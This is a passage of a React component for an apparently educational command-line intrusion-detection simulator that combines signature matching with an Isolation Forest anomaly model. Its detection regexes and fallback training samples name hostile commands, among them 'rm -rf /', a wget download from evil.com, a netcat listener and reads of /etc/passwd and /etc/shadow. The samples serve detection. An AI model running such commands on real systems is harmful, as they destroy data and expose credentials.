import React, { useState, useRef, useEffect } from 'react';
import { Line } from 'react-chartjs-2';
import { Chart as ChartJS, LineElement, PointElement, LinearScale, CategoryScale, Tooltip, Legend } from 'chart.js';
import { Link } from 'react-router-dom';
import { Box, Button, IconButton, Typography, Paper, useTheme, Select, MenuItem, FormControl, InputLabel, Slider, Switch, FormControlLabel } from '@mui/material';
import FullscreenIcon from '@mui/icons-material/Fullscreen';
import FullscreenExitIcon from '@mui/icons-material/FullscreenExit';
import KeyboardIcon from '@mui/icons-material/Keyboard';
import SettingsIcon from '@mui/icons-material/Settings';
import RealTerminal from '../../components/RealTerminal';

// Hybrid Detection Parameters
const algorithmParameters = {
  signatureBased: {
    sensitivity: 0.8,
    fuzzyMatching: true,
    maxEditDistance: 2,
    caseSensitive: false,
    timeWindow: {
      default: 300,
      min: 60,
      max: 3600
    },
    thresholds: {
      default: 3,
      min: 1,
      max: 10
    }
  },
  anomalyBased: {
    statistical: {
      sensitivity: 0.8,
      windowSize: 100,
      threshold: 2.0,
      updateInterval: 60
    },
    behavioral: {
      commandFrequency: true,
      timePatterns: true,
      sequenceAnalysis: true,
      userProfiles: true
    },
    machineLearning: {
      modelType: 'isolation_forest',
      contamination: 0.1,
      nEstimators: 100,
      kernel: 'rbf'
    }
  },
  hybrid: {
    weightSignature: 0.6,
    weightAnomaly: 0.4,
    confidenceThreshold: 0.1, // Lowered for debugging
    correlationWindow: 300,
    adaptiveWeights: true
  }
};

// Signature Database
const signatureDatabase = {
  ssh_attacks: {
    name: 'SSH Attack Patterns',
    patterns: [
      {
        id: 'ssh_brute_force',
        name: 'SSH Brute Force',
        regex: /ssh.*@.*\s*.*\s*.*\s*.*\s*.*\s*.*/,
        description: 'Multiple failed SSH login attempts',
        severity: 'High',
        threshold: 3,
        timeWindow: 300
      },
      {
        id: 'ssh_port_forwarding',
        name: 'SSH Port Forwarding',
        regex: /ssh.*-L.*|ssh.*-R.*|ssh.*-D.*/,
        description: 'Suspicious SSH port forwarding attempt',
        severity: 'Medium',
        threshold: 1,
        timeWindow: 60
      }
    ]
  },
  file_operations: {
    name: 'File Operation Patterns',
    patterns: [
      {
        id: 'sensitive_file_access',
        name: 'Sensitive File Access',
        regex: /cat.*\/etc\/(passwd|shadow|hosts|hostname|resolv\.conf)/,
        description: 'Access to sensitive system files',
        severity: 'High',
        threshold: 1,
        timeWindow: 60
      },
      {
        id: 'suspicious_download',
        name: 'Suspicious Download',
        regex: /(wget|curl).*(\.sh|\.py|\.exe|\.bin|\.tar\.gz)/,
        description: 'Download of potentially malicious files',
        severity: 'High',
        threshold: 1,
        timeWindow: 60
      }
    ]
  }
};

// Anomaly Detection Dataset
const anomalyDataset = {
  normal: {
    commandFrequency: {
      'ls': 0.15,
      'cd': 0.12,
      'cat': 0.08,
      'git': 0.07,
      'npm': 0.06,
      'python': 0.05,
      'ssh': 0.04,
      'vim': 0.03,
      'mkdir': 0.02,
      'rm': 0.01
    },
    timePatterns: {
      workingHours: [9, 17],
      breakPatterns: [12, 13],
      sessionLength: 1800
    },
    commandSequences: [
      ['git', 'clone', 'npm', 'install'],
      ['cd', 'ls', 'cat'],
      ['mkdir', 'cd', 'vim'],
      ['ssh', 'ls', 'cd']
    ]
  },
  anomalous: {
    commandFrequency: {
      'nmap': 0.3,
      'wget': 0.25,
      'curl': 0.2,
      'chmod': 0.15,
      'cat': 0.1
    },
    timePatterns: {
      workingHours: [0, 6],
      breakPatterns: [],
      sessionLength: 300
    },
    commandSequences: [
      ['wget', 'chmod', './'],
      ['nmap', 'ssh', 'cat'],
      ['curl', 'chmod', 'rm']
    ]
  }
};

// Aho-Corasick Algorithm Implementation
class AhoCorasickNode {
  constructor() {
    this.children = new Map();
    this.failure = null;
    this.output = [];
    this.isEndOfPattern = false;
  }
}

class AhoCorasick {
  constructor() {
    this.root = new AhoCorasickNode();
    this.patterns = [];
  }

  // Build the trie with all patterns
  addPattern(pattern, id) {
    this.patterns.push({ pattern, id });
    let currentNode = this.root;
    
    for (const char of pattern.toLowerCase()) {
      if (!currentNode.children.has(char)) {
        currentNode.children.set(char, new AhoCorasickNode());
      }
      currentNode = currentNode.children.get(char);
    }
    
    currentNode.isEndOfPattern = true;
    currentNode.output.push({ pattern, id });
  }

  // Build failure function (KMP-like)
  buildFailureFunction() {
    const queue = [];
    
    // Initialize first level
    for (const child of this.root.children.values()) {
      child.failure = this.root;
      queue.push(child);
    }
    
    // Build failure links using BFS
    while (queue.length > 0) {
      const currentNode = queue.shift();
      
      for (const [char, childNode] of currentNode.children) {
        queue.push(childNode);
        
        let failureNode = currentNode.failure;
        while (failureNode !== null && !failureNode.children.has(char)) {
          failureNode = failureNode.failure;
        }
        
        if (failureNode === null) {
          childNode.failure = this.root;
        } else {
          childNode.failure = failureNode.children.get(char);
          childNode.output = [...childNode.output, ...childNode.failure.output];
        }
      }
    }
  }

  // Search for all patterns in text
  search(text) {
    const matches = [];
    let currentNode = this.root;
    
    for (let i = 0; i < text.length; i++) {
      const char = text[i].toLowerCase();
      
      // Follow failure links until we find a match or reach root
      while (currentNode !== this.root && !currentNode.children.has(char)) {
        currentNode = currentNode.failure;
      }
      
      if (currentNode.children.has(char)) {
        currentNode = currentNode.children.get(char);
        
        // Check for pattern matches
        if (currentNode.output.length > 0) {
          for (const match of currentNode.output) {
            matches.push({
              pattern: match.pattern,
              id: match.id,
              position: i - match.pattern.length + 1,
              endPosition: i
            });
          }
        }
      }
    }
    
    return matches;
  }
}

// Isolation Forest Implementation
class IsolationTree {
  constructor(maxDepth = 8) {
    this.maxDepth = maxDepth;
    this.root = null;
  }

  fit(data) {
    this.root = this.buildTree(data, 0);
  }

  buildTree(data, depth) {
    if (depth >= this.maxDepth || data.length <= 1) {
      return { 
        type: 'leaf', 
        size: data.length 
      };
    }

    // Randomly select feature and split value
    const featureIndex = Math.floor(Math.random() * data[0].length);
    const featureValues = data.map(point => point[featureIndex]);
    const minVal = Math.min(...featureValues);
    const maxVal = Math.max(...featureValues);
    
    if (minVal === maxVal) {
      return { 
        type: 'leaf', 
        size: data.length 
      };
    }

    const splitValue = Math.random() * (maxVal - minVal) + minVal;
    
    const leftData = data.filter(point => point[featureIndex] < splitValue);
    const rightData = data.filter(point => point[featureIndex] >= splitValue);

    return {
      type: 'internal',
      featureIndex,
      splitValue,
      left: this.buildTree(leftData, depth + 1),
      right: this.buildTree(rightData, depth + 1)
    };
  }

  pathLength(point, node = this.root, depth = 0) {
    if (node.type === 'leaf') {
      return depth + this.averagePathLength(node.size);
    }

    if (point[node.featureIndex] < node.splitValue) {
      return this.pathLength(point, node.left, depth + 1);
    } else {
      return this.pathLength(point, node.right, depth + 1);
    }
  }

  averagePathLength(n) {
    if (n <= 1) return 0;
    return 2 * (Math.log(n - 1) + 0.5772156649) - (2 * (n - 1) / n);
  }
}

class IsolationForest {
  constructor(nTrees = 100, maxDepth = 8, contamination = 0.1) {
    this.nTrees = nTrees;
    this.maxDepth = maxDepth;
    this.contamination = contamination;
    this.trees = [];
    this.sampleSize = 256;
  }

  fit(data) {
    this.trees = [];
    const n = data.length;
    this.sampleSize = Math.min(this.sampleSize, n);

    for (let i = 0; i < this.nTrees; i++) {
      // Random sampling for each tree
      const sample = [];
      for (let j = 0; j < this.sampleSize; j++) {
        const randomIndex = Math.floor(Math.random() * n);
        sample.push(data[randomIndex]);
      }

      const tree = new IsolationTree(this.maxDepth);
      tree.fit(sample);
      this.trees.push(tree);
    }
  }

  anomalyScore(point) {
    if (this.trees.length === 0) return 0;

    const avgPathLength = this.trees.reduce((sum, tree) => {
      return sum + tree.pathLength(point);
    }, 0) / this.trees.length;

    const normalizedScore = Math.pow(2, -avgPathLength / this.averagePathLength(this.sampleSize));
    return normalizedScore;
  }

  averagePathLength(n) {
    if (n <= 1) return 0;
    return 2 * (Math.log(n - 1) + 0.5772156649) - (2 * (n - 1) / n);
  }
}

// Hybrid Detection Algorithms using Aho-Corasick and Isolation Forest
const hybridAlgorithms = {
  signature: {
    ahoCorasick: new AhoCorasick(),
    initialized: false,
    
    initialize() {
      if (this.initialized) return;
      
      // Add all patterns to Aho-Corasick automaton
      Object.values(signatureDatabase).forEach(category => {
        category.patterns.forEach(pattern => {
          // Convert regex patterns to string patterns for Aho-Corasick
          const patternStrings = this.extractPatternStrings(pattern.regex);
          patternStrings.forEach(str => {
            this.ahoCorasick.addPattern(str, pattern.id);
          });
        });
      });
      
      this.ahoCorasick.buildFailureFunction();
      this.initialized = true;
    },

    extractPatternStrings(regex) {
      // Extract string patterns from regex for Aho-Corasick
      const regexStr = regex.toString();
      const patterns = [];
      
      // Common attack patterns
      if (regexStr.includes('ssh')) patterns.push('ssh');
      if (regexStr.includes('cat')) patterns.push('cat');
      if (regexStr.includes('wget')) patterns.push('wget');
      if (regexStr.includes('curl')) patterns.push('curl');
      if (regexStr.includes('nmap')) patterns.push('nmap');
      if (regexStr.includes('passwd')) patterns.push('passwd');
      if (regexStr.includes('shadow')) patterns.push('shadow');
      if (regexStr.includes('chmod')) patterns.push('chmod');
      if (regexStr.includes('/etc/')) patterns.push('/etc/');
      if (regexStr.includes('.sh')) patterns.push('.sh');
      if (regexStr.includes('.py')) patterns.push('.py');
      if (regexStr.includes('.exe')) patterns.push('.exe');
      
      return patterns.length > 0 ? patterns : [''];
    },

    async matchCommand(command) {
      try {
        // Call the database-backed signature detection API
        const response = await fetch('/api/signature/detect', {
          method: 'POST',
          headers: {
            'Content-Type': 'application/json'
          },
          body: JSON.stringify({ command })
        });

        if (response.ok) {
          const data = await response.json();
          if (data.matches && data.matches.length > 0) {
            const severityFor = (m) => {
              const desc = (m.description || m.pattern || '').toLowerCase();
              if (/rm\s+-rf|chmod\s+\+x|shadow|passwd|history\s+-c/.test(desc)) return 'High';
              if (/ssh\s+-[lrd]|port forward|nmap|scan|wget|curl|download|sudo|su\b/.test(desc)) return 'Medium';
              return 'Low';
            };
            return data.matches.map(match => {
              const sev = severityFor(match);
              return {
                type: 'Signature-Based (Database)',
                pattern: match.description || match.pattern,
                severity: sev,
                description: match.description || 'Database signature match',
                confidence: sev === 'High' ? 0.95 : sev === 'Medium' ? 0.85 : 0.7,
                algorithm: 'Aho-Corasick (Database)',
                id: match.id,
                pattern_text: match.pattern
              };
            });
          }
        }
      } catch (error) {
        console.error('Failed to call signature API:', error);
      }

      // Fallback to local detection if API fails
      this.initialize();
      const matches = this.ahoCorasick.search(command);
      const detections = [];
      
      // Map matches back to patterns
      Object.values(signatureDatabase).forEach(category => {
        category.patterns.forEach(pattern => {
          const hasMatch = matches.some(match => match.id === pattern.id) || pattern.regex.test(command);
          if (hasMatch) {
            const sev = pattern.severity || 'Medium';
            detections.push({
              type: 'Signature-Based (Aho-Corasick)',
              pattern: pattern.name,
              severity: sev,
              description: pattern.description,
              confidence: sev === 'High' ? 0.95 : sev === 'Medium' ? 0.85 : 0.7,
              algorithm: 'Aho-Corasick (Local)'
            });
          }
        });
      });
      
      return detections;
    },

    analyzeTimeWindow: async (detections, commandHistory, timeWindow) => {
      // For educational purposes, we want to show immediate detections
      // The time window analysis is more relevant for persistent threats
      // So we'll just return the detections as-is for now, but could enhance later
      return detections;
    }
  },

  anomaly: {
    isolationForest: new IsolationForest(100, 8, 0.1),
    trainingData: [],
    trained: false,
    dbConfig: null,
    dbPatterns: [],
    dbBoostConfig: null,

    async loadDatabaseConfig() {
      try {
        // Load model configuration
        const configResponse = await fetch('/api/isolation-forest/config/hybrid_detection');
        if (configResponse.ok) {
          const configData = await configResponse.json();
          this.dbConfig = configData.config;
        }

        // Load feature patterns
        const patternsResponse = await fetch('/api/isolation-forest/patterns');
        if (patternsResponse.ok) {
          const patternsData = await patternsResponse.json();
          this.dbPatterns = patternsData.patterns;
        }

        // Load boost configuration
        const boostResponse = await fetch('/api/isolation-forest/boost-config/hybrid_conservative');
        if (boostResponse.ok) {
          const boostData = await boostResponse.json();
          this.dbBoostConfig = boostData.config;
        }

        console.log('Loaded Isolation Forest config from database:', {
          config: this.dbConfig,
          patterns: this.dbPatterns.length,
          boost: this.dbBoostConfig
        });
      } catch (error) {
        console.warn('Failed to load database config, using defaults:', error);
      }
    },

    extractFeatures(command, commandHistory, sessionStats) {
      // Extract 14-dimensional feature vector
      const features = [
        command.length,                                    // Command length
        (command.match(/\s+/g) || []).length,             // Number of arguments
        (command.match(/[|&;]/g) || []).length,           // Special characters
        (command.match(/\//g) || []).length,              // Path separators
        sessionStats.commandCount || 0,                   // Session command count
        sessionStats.sessionDuration || 0,               // Session duration (minutes)
        commandHistory.length,                            // Total commands in history
        this.getCommandFrequency(command, commandHistory), // Command frequency
        this.getTimeOfDay(),                              // Time of day (0-23)
        this.isWeekend() ? 1 : 0,                        // Weekend flag
        this.hasSuspiciousPatterns(command) ? 1 : 0,     // Suspicious patterns
        this.hasNetworkActivity(command) ? 1 : 0,        // Network activity
        this.hasFileAccess(command) ? 1 : 0,             // File access
        this.hasScriptExecution(command) ? 1 : 0         // Script execution
      ];
      
      return features;
    },

    getCommandFrequency(command, history) {
      const cmdName = command.split(' ')[0];
      const occurrences = history.filter(h => h.command.startsWith(cmdName)).length;
      return history.length > 0 ? occurrences / history.length : 0;
    },

    getTimeOfDay() {
      return new Date().getHours();
    },

    isWeekend() {
      const day = new Date().getDay();
      return day === 0 || day === 6;
    },

    hasSuspiciousPatterns(command) {
      // Use database patterns if available, otherwise fallback to hardcoded
      if (this.dbPatterns.length > 0) {
        return this.dbPatterns.some(pattern => {
          if (pattern.feature_type === 'suspicious_commands') {
            try {
              const regex = new RegExp(pattern.pattern_regex, 'i');
              return regex.test(command);
            } catch (e) {
              return false;
            }
          }
          return false;
        });
      }
      
      // Fallback to hardcoded patterns
      const suspiciousPatterns = [
        /rm\s+-rf/, /wget|curl/, /chmod\s+\+x/, /nc\s+-l/, /nmap/,
        /sudo\s+su/, /cat\s+\/etc\/passwd/, /history\s+-c/
      ];
      return suspiciousPatterns.some(pattern => pattern.test(command));
    },

    hasNetworkActivity(command) {
      // Use database patterns if available
      if (this.dbPatterns.length > 0) {
        return this.dbPatterns.some(pattern => {
          if (pattern.feature_type === 'network_activity') {
            try {
              const regex = new RegExp(pattern.pattern_regex, 'i');
              return regex.test(command);
            } catch (e) {
              return false;
            }
          }
          return false;
        });
      }
      
      return /wget|curl|ssh|scp|ftp|nc|telnet|ping/.test(command);
    },

    hasFileAccess(command) {
      // Use database patterns if available
      if (this.dbPatterns.length > 0) {
        return this.dbPatterns.some(pattern => {
          if (pattern.feature_type === 'file_access') {
            try {
              const regex = new RegExp(pattern.pattern_regex, 'i');
              return regex.test(command);
            } catch (e) {
              return false;
            }
          }
          return false;
        });
      }
      
      return /cat|less|more|head|tail|grep|find|locate/.test(command);
    },

    hasScriptExecution(command) {
      // Use database patterns if available
      if (this.dbPatterns.length > 0) {
        return this.dbPatterns.some(pattern => {
          if (pattern.feature_type === 'script_execution') {
            try {
              const regex = new RegExp(pattern.pattern_regex, 'i');
              return regex.test(command);
            } catch (e) {
              return false;
            }
          }
          return false;
        });
      }
      
      return /python|bash|sh|perl|ruby|node|\.\/|\.sh|\.py/.test(command);
    },

    async initializeTraining() {
      if (this.trained) return;
      
      // Load database configuration first
      await this.loadDatabaseConfig();
      
      // Use database configuration if available
      if (this.dbConfig) {
        this.isolationForest = new IsolationForest(
          this.dbConfig.n_trees || 100,
          this.dbConfig.max_depth || 8,
          parseFloat(this.dbConfig.contamination) || 0.1
        );
      }
      
      // Generate training data from normal and anomalous patterns
      this.trainingData = [];
      
      try {
        // Try to load training data from database
        const response = await fetch('/api/isolation-forest/training-data');
        if (response.ok) {
          const data = await response.json();
          if (data.success && data.training_data.length > 0) {
            // Use database training data
            data.training_data.forEach(sample => {
              if (sample.feature_vector) {
                this.trainingData.push(sample.feature_vector);
              } else {
                // Generate features for database samples without feature vectors
                const features = this.extractFeatures(
                  sample.command_pattern, 
                  [], 
                  { commandCount: sample.label === 'normal' ? 10 : 1, sessionDuration: sample.label === 'normal' ? 30 : 5 }
                );
                this.trainingData.push(features);
              }
            });
          }
        }
      } catch (error) {
        console.warn('Failed to load training data from database, using defaults:', error);
      }
      
      // Fallback to hardcoded training data if database is empty
      if (this.trainingData.length === 0) {
        // Normal command patterns
        const normalCommands = [
          'ls', 'cd /home/user', 'cat file.txt', 'git status', 'npm install',
          'python script.py', 'vim file.js', 'mkdir project', 'cp file1 file2',
          'mv old new', 'grep pattern file', 'find . -name "*.js"'
        ];
        
        normalCommands.forEach(cmd => {
          const features = this.extractFeatures(cmd, [], { commandCount: 10, sessionDuration: 30 });
          this.trainingData.push(features);
        });
        
        // Add some anomalous patterns for better training
        const anomalousCommands = [
          'rm -rf /', 'wget http://evil.com/malware.sh', 'chmod +x malware',
          'nc -l 4444', 'nmap -sS target', 'cat /etc/passwd', 'sudo su -'
        ];
        
        anomalousCommands.forEach(cmd => {
          const features = this.extractFeatures(cmd, [], { commandCount: 1, sessionDuration: 5 });
          this.trainingData.push(features);
        });
      }
      
      this.isolationForest.fit(this.trainingData);
      this.trained = true;
    },

    async detectAnomaly(command, commandHistory, sessionStats) {
      try {
        // Call the database-backed isolation forest API
        const response = await fetch('/api/isolation-forest/detect', {
          method: 'POST',
          headers: {
            'Content-Type': 'application/json'
          },
          body: JSON.stringify({ command })
        });

        if (!response.ok) {
          throw new Error(`API request failed: ${response.status}`);
        }

        const data = await response.json();
        // New enriched fields (backend may provide these; fallback gracefully)
        if (data.success && data.anomaly_detected) {
          const baseScore = data.base_score ?? data.anomaly_score ?? 0;
          const boostedScore = data.boosted_score ?? data.anomaly_score ?? baseScore;
          const threshold = data.threshold ?? 0.5;
          const matchedPatterns = data.matched_patterns || data.detected_patterns || [];
          const features = data.features || [];
          const explanation = data.explanation || 'Boosted anomaly score derived from semantic pattern boosts and feature normalization.';
          const modelVersion = data.model_version || data.modelVersion || 'unknown';
          return {
            type: 'Anomaly-Based (Isolation Forest)',
            severity: boostedScore > 0.85 ? 'High' : boostedScore > 0.65 ? 'Medium' : 'Low',
            description: `Anomalous behavior detected (Boosted: ${(boostedScore * 100).toFixed(1)}%)`,
            confidence: boostedScore,
            algorithm: `Isolation Forest (Database v${modelVersion})`,
            rawScore: baseScore,
            boostedScore,
            threshold,
            matchedPatterns,
            features,
            explanation,
            modelVersion,
            databasePatterns: matchedPatterns,
            detectedPatterns: matchedPatterns
          };
        }

        return null;
      } catch (error) {
        console.error('Failed to call isolation forest API:', error);
        
        // Fallback to local detection if API fails
        await this.initializeTraining();
        
        const features = this.extractFeatures(command, commandHistory, sessionStats);
        const anomalyScore = this.isolationForest.anomalyScore(features);
        
        if (anomalyScore > 0.6) {
          return {
            type: 'Anomaly-Based (Isolation Forest)',
            severity: anomalyScore > 0.8 ? 'High' : 'Medium',
            description: `Anomalous behavior detected (Score: ${(anomalyScore * 100).toFixed(1)}%) - Fallback`,
            confidence: anomalyScore,
            algorithm: 'Isolation Forest (Local)',
            rawScore: anomalyScore,
            boostedScore: anomalyScore,
            threshold: 0.6,
            matchedPatterns: [],
            features,
            explanation: 'Local fallback Isolation Forest scoring without semantic boosts.',
            databasePatterns: false
          };
        }
        
        return null;
      }
    }
  },

  hybrid: {
    calculateConfidence: (signatureScore, anomalyScore) => {
      const weightedScore = 
        (signatureScore * algorithmParameters.hybrid.weightSignature) +
        (anomalyScore * algorithmParameters.hybrid.weightAnomaly);
      // Ensure hybrid score doesn't exceed individual scores inappropriately
      return Math.min(weightedScore, Math.max(signatureScore, anomalyScore) * 1.1);
    },

    correlateDetections: (signatureDetections, anomalyDetections, command) => {
      const correlated = [];
      // Direct correlation - both methods detected something
      if (signatureDetections.length > 0 && anomalyDetections.length > 0) {
        const maxSig = signatureDetections.reduce((a,b)=> b.confidence>a.confidence?b:a, signatureDetections[0]);
        const ano = anomalyDetections.reduce((a,b)=> b.confidence>a.confidence?b:a, anomalyDetections[0]);
        const maxSigConfidence = maxSig.confidence;
        const maxAnoConfidence = ano.confidence; // boosted
        const baseAno = ano.rawScore ?? maxAnoConfidence;
        const boostDelta = maxAnoConfidence - baseAno;
        const hybridScore = hybridAlgorithms.hybrid.calculateConfidence(maxSigConfidence, maxAnoConfidence);
  const severity = hybridScore > 0.9 ? 'High' : hybridScore > 0.7 ? 'Medium' : 'Low';
        correlated.push({
          type: 'Hybrid Detection (Aho-Corasick + Isolation Forest)',
          severity,
          description: 'Threat corroborated by both signature and boosted anomaly analysis',
          confidence: hybridScore,
          componentScores: {
            signature: maxSigConfidence,
            anomaly: maxAnoConfidence,
            hybrid: hybridScore
          },
          algorithm: 'Hybrid (AC + IF)',
          details: {
            signatureMatches: signatureDetections.length,
            anomalyScore: maxAnoConfidence,
            anomalyBaseScore: baseAno,
            anomalyBoostedScore: maxAnoConfidence,
            boostDelta,
            threshold: ano.threshold,
            matchedPatterns: ano.matchedPatterns,
            features: ano.features,
            explanation: ano.explanation,
            modelVersion: ano.modelVersion,
            fusionRule: `hybrid = (signature * ${algorithmParameters.hybrid.weightSignature}) + (anomaly_boosted * ${algorithmParameters.hybrid.weightAnomaly})`,
            correlationStrength: 'Strong'
          },
          correlated: [
            ...signatureDetections.slice(0,2),
            ...anomalyDetections.slice(0,2)
          ]
        });
      } else if (signatureDetections.length > 0) {
        const sig = signatureDetections[0];
        const adjustedHybrid = sig.confidence * 0.9;
        const sigSeverity = sig.confidence >= 0.9 ? sig.severity : (sig.confidence >= 0.8 ? 'Medium' : 'Low');
        correlated.push({
          type: 'Signature-Based Detection',
          severity: sigSeverity,
          description: `Known attack pattern detected: ${sig.pattern}`,
          confidence: adjustedHybrid,
          componentScores: {
            signature: sig.confidence,
            anomaly: 0,
            hybrid: adjustedHybrid
          },
          algorithm: 'Aho-Corasick',
          details: {
            pattern: sig.pattern,
            correlationStrength: 'Medium'
          },
          correlated: [sig]
        });
      } else if (anomalyDetections.length > 0) {
        const ano = anomalyDetections[0];
        correlated.push({
          type: 'Anomaly-Based Detection',
          severity: ano.severity,
          description: ano.description,
            confidence: ano.confidence * 0.85,
          componentScores: {
            signature: 0,
            anomaly: ano.confidence,
            hybrid: ano.confidence * 0.85
          },
          algorithm: 'Isolation Forest',
          details: {
            anomalyScore: ano.confidence,
            anomalyBaseScore: ano.rawScore,
            anomalyBoostedScore: ano.boostedScore,
            boostDelta: (ano.boostedScore ?? ano.confidence) - (ano.rawScore ?? ano.confidence),
            threshold: ano.threshold,
            matchedPatterns: ano.matchedPatterns,
            features: ano.features,
            explanation: ano.explanation,
            modelVersion: ano.modelVersion,
            fusionRule: `hybrid = anomaly_boosted * 0.85 (no signature contribution)`,
            correlationStrength: 'Medium'
          },
          correlated: [ano]
        });
      }
      return correlated;
    }
  }
};

// Helper functions
const fuzzyMatch = (str, pattern, maxDistance) => {
  const regexStr = pattern.toString().slice(1, -1);
  const words = str.split(/\s+/);
  return words.some(word => {
    const distance = levenshteinDistance(word, regexStr);
    return distance <= maxDistance;
  });
};

const levenshteinDistance = (str1, str2) => {
  const m = str1.length;
  const n = str2.length;
  const dp = Array(m + 1).fill().map(() => Array(n + 1).fill(0));

  for (let i = 0; i <= m; i++) dp[i][0] = i;
  for (let j = 0; j <= n; j++) dp[0][j] = j;

  for (let i = 1; i <= m; i++) {
    for (let j = 1; j <= n; j++) {
      if (str1[i - 1] === str2[j - 1]) {
        dp[i][j] = dp[i - 1][j - 1];
      } else {
        dp[i][j] = Math.min(
          dp[i - 1][j - 1] + 1,
          dp[i - 1][j] + 1,
          dp[i][j - 1] + 1
        );
      }
    }
  }

  return dp[m][n];
};

const calculateSequenceSimilarity = (seq1, seq2) => {
  const set1 = new Set(seq1);
  const set2 = new Set(seq2);
  const intersection = new Set([...set1].filter(x => set2.has(x)));
  const union = new Set([...set1, ...set2]);
  return intersection.size / union.size;
};

const Hybrid = () => {
  const theme = useTheme();
  const [activeTab, setActiveTab] = useState('theory');
  const [isFullscreen, setIsFullscreen] = useState(false);
  const [terminalOutput, setTerminalOutput] = useState([]);
  const [detectionResults, setDetectionResults] = useState([]);
  const [showSettings, setShowSettings] = useState(false);
  const [parameters, setParameters] = useState(algorithmParameters);
  // --- UI polish states (simulation view) ---
  const [paused, setPaused] = useState(false);              // pause live hybrid processing
  const [filterText, setFilterText] = useState('');         // filter detection log
  const [detectionLog, setDetectionLog] = useState([]);     // historical detections
  const [showLivePanel, setShowLivePanel] = useState(true); // collapsible live panel
  const [showAnalytics, setShowAnalytics] = useState(true); // collapsible analytics panel
  const [showPatternLibrary, setShowPatternLibrary] = useState(false); // hybrid pattern library toggle
  const [hybridPatterns, setHybridPatterns] = useState([]); // unified signature + anomaly patterns
  const [patternFilter, setPatternFilter] = useState('');
  const [patternLoading, setPatternLoading] = useState(false);
  const [patternError, setPatternError] = useState(null);
  const MAX_LIVE = 6;                                       // live panel window size
  const [hybridSeries, setHybridSeries] = useState([]);      // time series for hybrid confidence
  const [selectedDetection, setSelectedDetection] = useState(null); // currently selected detection for inspector
  const containerRef = useRef(null);
  const terminalRef = useRef(null);

  // State for detection
  const [commandWindow, setCommandWindow] = useState([]);
  const [commandHistory, setCommandHistory] = useState([]);
  const [sessionStats, setSessionStats] = useState({
    commandCount: 0,
    sessionStart: Date.now(),
    sessionDuration: 0
  });

  // Enhanced hybrid detection using Aho-Corasick and Isolation Forest
  const detectThreats = async (command) => {
    console.log('Starting threat detection for:', command);
    const now = Date.now();
    
    // Update session statistics
    const newSessionStats = {
      commandCount: sessionStats.commandCount + 1,
      sessionStart: sessionStats.sessionStart,
      sessionDuration: Math.floor((now - sessionStats.sessionStart) / 60000) // minutes
    };
    setSessionStats(newSessionStats);

    // Update command history
    const newCommandEntry = { command, timestamp: now };
    const updatedHistory = [...commandHistory, newCommandEntry];
    setCommandHistory(updatedHistory);

    // Signature-based detection using Aho-Corasick
    console.log('Running signature detection...');
    const signatureDetections = await hybridAlgorithms.signature.matchCommand(command);
    console.log('Signature detections:', signatureDetections);
    
    // Apply time window analysis for signatures
    console.log('Running time window analysis...');
    const filteredSignatureDetections = await hybridAlgorithms.signature.analyzeTimeWindow(
      signatureDetections, 
      updatedHistory, 
      algorithmParameters.signatureBased.timeWindow.default
    );
    console.log('Filtered signature detections:', filteredSignatureDetections);

    // Anomaly-based detection using Isolation Forest
    console.log('Running anomaly detection...');
    const anomalyDetection = await hybridAlgorithms.anomaly.detectAnomaly(
      command, 
      updatedHistory, 
      newSessionStats
    );
    console.log('Anomaly detection result:', anomalyDetection);
    const anomalyDetections = anomalyDetection ? [anomalyDetection] : [];

    // Hybrid correlation and final decision
    console.log('Running hybrid correlation...');
    const hybridDetections = hybridAlgorithms.hybrid.correlateDetections(
      filteredSignatureDetections,
      anomalyDetections,
      command
    );
    console.log('Hybrid detections:', hybridDetections);

    // Filter by confidence threshold
    const finalDetections = hybridDetections.filter(detection => {
      console.log(`Detection confidence: ${detection.confidence}, threshold: ${algorithmParameters.hybrid.confidenceThreshold}`);
      return detection.confidence >= algorithmParameters.hybrid.confidenceThreshold;
    });
    console.log('Final detections after confidence filtering:', finalDetections);
    console.log('Confidence threshold:', algorithmParameters.hybrid.confidenceThreshold);

    return finalDetections;
  };

  const toggleFullscreen = () => {
    if (!document.fullscreenElement) {
      containerRef.current?.requestFullscreen();
      setIsFullscreen(true);
    } else {
      document.exitFullscreen();
      setIsFullscreen(false);
    }
  };

  useEffect(() => {
    const handleFullscreenChange = () => {
      setIsFullscreen(!!document.fullscreenElement);
    };

    document.addEventListener('fullscreenchange', handleFullscreenChange);
    return () => {
      document.removeEventListener('fullscreenchange', handleFullscreenChange);
    };
  }, []);

  const handleTabChange = (tab) => {
    setActiveTab(tab);
    if (tab === 'simulation') {
      setTerminalOutput([]);
      setDetectionResults([]);
    }
  };

  const handleTerminalCommand = async (command) => {
    console.log('Terminal command received:', command);
    if (paused) return; // skip processing while paused
    
    // Implement hybrid detection logic for command
    try {
      const threats = await detectThreats(command);
      console.log('Threats detected:', threats);
      
      if (threats.length > 0) {
        const timeLabel = new Date().toLocaleTimeString();
        const enriched = threats.map(threat => ({
          ...threat,
          timestamp: timeLabel,
          command,
          _id: Date.now() + Math.random()
        }));
        setDetectionResults(prev => [...prev, ...enriched]);
        const top = enriched.reduce((a,b)=> (b.confidence||0) > (a.confidence||0) ? b : a, enriched[0]);
        setHybridSeries(prev => [...prev, {
          t: timeLabel,
          hybrid: top.componentScores?.hybrid || top.confidence || 0,
          signature: top.componentScores?.signature ?? (top.type.includes('Signature') ? top.confidence : 0),
          anomaly: top.componentScores?.anomaly ?? (top.type.includes('Anomaly') ? top.confidence : 0),
          severity: top.severity,
          correlation: top.details?.correlationStrength || (top.type?.includes('Hybrid') ? 'Strong' : 'Single'),
          type: top.type,
          componentScores: top.componentScores || {
            signature: top.componentScores?.signature ?? (top.type.includes('Signature') ? top.confidence : 0),
            anomaly: top.componentScores?.anomaly ?? (top.type.includes('Anomaly') ? top.confidence : 0),
            hybrid: top.componentScores?.hybrid || top.confidence || 0
          }
        }]);
        console.log('Detection results & series updated');
      } else {
        console.log('No threats detected for command:', command);
      }
    } catch (error) {
      console.error('Error in threat detection:', error);
    }
  };

  // Build detection log (deduplicate simple by timestamp+command+type)
  useEffect(() => {
    if (detectionResults.length === 0) return;
    setDetectionLog(prev => {
      const next = [...prev];
      detectionResults.forEach(r => {
        if (!next.some(e => e.timestamp === r.timestamp && e.command === r.command && e.type === e.type)) {
          next.push(r);
        }
      });
      return next;
    });
  }, [detectionResults]);

  const filteredLog = detectionLog.filter(entry => {
    if (!filterText) return true;
    const t = filterText.toLowerCase();
    return (
      (entry.command && entry.command.toLowerCase().includes(t)) ||
      (entry.description && entry.description.toLowerCase().includes(t)) ||
      (entry.type && entry.type.toLowerCase().includes(t))
    );
  });

